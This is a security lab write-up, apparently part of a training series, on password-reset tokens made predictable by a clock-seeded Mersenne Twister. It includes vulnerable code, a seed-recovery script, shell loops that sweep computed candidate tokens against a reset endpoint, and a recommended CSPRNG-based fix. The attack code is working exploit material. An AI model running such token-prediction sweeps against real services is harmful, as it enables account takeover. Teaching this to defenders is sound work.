# Lab 37 — Recover

## The bug

```python
rng = random.Random(int(time.time()))
return "%08x%08x" % (rng.getrandbits(32), rng.getrandbits(32))
```

Two mistakes at once, and each alone would be enough:

1. **A statistical PRNG where a cryptographic one belongs.** `random` is a
   Mersenne Twister: fast, uniform, and completely deterministic given its
   state. It is for simulations, not secrets. (`Math.random()`, `mt_rand()`,
   `rand()`, `java.util.Random` — all the same.)
2. **Seeded with the wall clock.** The state space collapses from 2^19937 to
   "which second was it", and the attacker knows that to within a few.

## Finding it from the outside

Issue yourself several tokens and put them next to each other. Look for:

* **length and alphabet** — 16 hex characters is 64 bits, which is short enough
  to be suspicious and long enough to look fine
* **shared prefixes or a monotone component** — a timestamp hiding in the value
* **two tokens issued in the same second being identical** — the loudest signal
  there is, and this app has it
* **decodability** — base64 that turns into a structure, a UUIDv1 (which
  contains a timestamp and a MAC address)

```bash
for i in 1 2 3; do
  h5i websec replay req_0 --session lab37 --create --reset-budget \
      --set method=POST --set path=/api/recover \
      --set header.Content-Type=application/json --set json.email=me@example.test
done
```

## Calibrate, then predict

The one token you are entitled to see is the whole attack. Recover the seed by
trying the seconds around now:

```python
now = int(time.time())
for t in range(now - 5, now + 6):
    r = random.Random(t)
    if "%08x%08x" % (r.getrandbits(32), r.getrandbits(32)) == mine:
        offset = t - now        # the server's clock, relative to yours
```

Then request the victim's token and compute the handful of candidates for the
second in which it was issued:

```bash
for T in $(python3 …candidates…); do
  h5i websec replay req_0 --session lab37 --create --reset-budget \
      --set path=/api/recover/use --set "query.token=$T"
done
```

Five candidates, five requests. No rate limit will notice.

Calibration is the transferable idea: **anything the system will show you about
its own randomness is a way to model the rest of it.**

## The stronger version of this attack

Where the seed is not the clock, the Mersenne Twister itself is still the
weakness: given **624 consecutive 32-bit outputs**, the internal state can be
recovered exactly and every future output predicted. If an application will hand
you enough tokens, you do not need to guess a seed at all. PHP's `mt_rand` needs
even fewer outputs in some configurations.

And the classic third case: a token derived from data you can supply —
`md5(email + timestamp)`, `sha1(username + counter)` — needs no randomness
analysis, only the recipe.

## The fix

```python
token = secrets.token_urlsafe(32)        # 256 bits from the OS CSPRNG
```

`secrets` in Python, `crypto.randomBytes` in Node, `SecureRandom` in Java,
`/dev/urandom` underneath all of them. Never `random`, `Math.random`, `rand`,
`mt_rand`, or `uuid1` for anything a security decision depends on.

Then: store a hash of the token, not the token; expire it in minutes; make it
single-use; bind it to the account and invalidate the others; and rate-limit
`/use` so a hundred candidate guesses are not free.

## h5i technique

A sweep of computed candidates through `--set query.token=`, with
`--reset-budget` so a long candidate list does not exhaust the page allowance
and return false negatives.
